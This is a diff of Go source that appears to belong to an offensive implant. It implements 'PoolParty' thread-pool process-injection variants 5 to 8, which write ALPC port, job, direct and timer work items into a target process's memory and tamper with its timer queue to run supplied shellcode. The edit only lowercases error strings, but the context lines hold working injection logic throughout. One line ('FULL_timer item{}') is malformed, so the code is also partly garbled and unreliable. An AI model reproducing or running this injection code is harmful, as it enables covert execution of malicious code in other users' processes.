@@ -39,7 +39,7 @@ func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		0, // PortAttributes
 	)
 	if status != 0 {
-		return output, fmt.Errorf("Port creation (temp) failed: 0x%X", status)
+		return output, fmt.Errorf("port creation (temp) failed: 0x%X", status)
 	}
 	defer windows.CloseHandle(windows.Handle(hTempAlpc))
 	output += fmt.Sprintf("[+] Created temporary ALPC port: 0x%X\n", hTempAlpc)
@@ -90,7 +90,7 @@ func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		uintptr(unsafe.Pointer(&portAttr)),
 	)
 	if status != 0 {
-		return output, fmt.Errorf("Port creation failed: 0x%X", status)
+		return output, fmt.Errorf("port creation failed: 0x%X", status)
 	}
 	defer windows.CloseHandle(windows.Handle(hAlpc))
 	output += fmt.Sprintf("[+] Created ALPC port '%s'\n", portName)
@@ -107,7 +107,7 @@ func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	tpAlpcBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpAlpc))[:unsafe.Sizeof(tpAlpc)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpAlpcAddr, tpAlpcBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for port item failed: %w", err)
+		return output, fmt.Errorf("memory write for port item failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote port item structure (%d bytes)\n", bytesWritten)
 
@@ -123,7 +123,7 @@ func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		uintptr(unsafe.Sizeof(alpcAssoc)),
 	)
 	if status != 0 {
-		return output, fmt.Errorf("Port info set failed: 0x%X", status)
+		return output, fmt.Errorf("port info set failed: 0x%X", status)
 	}
 	output += "[+] Associated ALPC port with target's I/O completion port\n"
 
@@ -224,7 +224,7 @@ func executeVariant6(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	tpJobBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpJob))[:unsafe.Sizeof(tpJob)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpJobAddr, tpJobBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for job item failed: %w", err)
+		return output, fmt.Errorf("memory write for job item failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote job item structure (%d bytes)\n", bytesWritten)
 
@@ -306,7 +306,7 @@ func executeVariant7(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	}
 	_, err = injectWriteMemory(hProcess, tpDirectAddr, tpDirectBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for direct item failed: %w", err)
+		return output, fmt.Errorf("memory write for direct item failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] direct item at: 0x%X\n", tpDirectAddr)
 
@@ -319,7 +319,7 @@ func executeVariant7(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		0,            // IoStatusInformation
 	)
 	if status != 0 {
-		return output, fmt.Errorf("Completion queue failed: 0x%X", status)
+		return output, fmt.Errorf("completion queue failed: 0x%X", status)
 	}
 	output += "[+] Queued packet to I/O completion port\n"
 	output += "[+] PoolParty Variant 7 injection completed successfully\n"
@@ -425,7 +425,7 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	timerBytes := (*[unsafe.Sizeof(FULL_timer item{})]byte)(unsafe.Pointer(pTpTimer))[:]
 	bytesWritten, err := injectWriteMemory(hProcess, tpTimerAddr, timerBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for timer item failed: %w", err)
+		return output, fmt.Errorf("memory write for timer item failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Wrote timer item structure (%d bytes)\n", bytesWritten)
 
@@ -466,14 +466,14 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	windowStartBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowStartLinksAddr))[:]
 	_, err = injectWriteMemory(hProcess, windowStartRootAddr, windowStartBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for WindowStart.Root failed: %w", err)
+		return output, fmt.Errorf("memory write for WindowStart.Root failed: %w", err)
 	}
 
 	// Write WindowEndLinks address to WindowEnd.Root
 	windowEndBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowEndLinksAddr))[:]
 	_, err = injectWriteMemory(hProcess, windowEndRootAddr, windowEndBytes)
 	if err != nil {
-		return output, fmt.Errorf("Memory write for WindowEnd.Root failed: %w", err)
+		return output, fmt.Errorf("memory write for WindowEnd.Root failed: %w", err)
 	}
 	output += "[+] Modified target process's pool timer queue to point to timer item\n"
 
@@ -489,7 +489,7 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		uintptr(unsafe.Pointer(&params)),
 	)
 	if status != 0 {
-		return output, fmt.Errorf("Timer set failed: 0x%X", status)
+		return output, fmt.Errorf("timer set failed: 0x%X", status)
 	}
 	output += "[+] Set timer to expire and trigger TppTimerQueueExpiration\n"
 	output += "[+] PoolParty Variant 8 injection completed successfully\n"
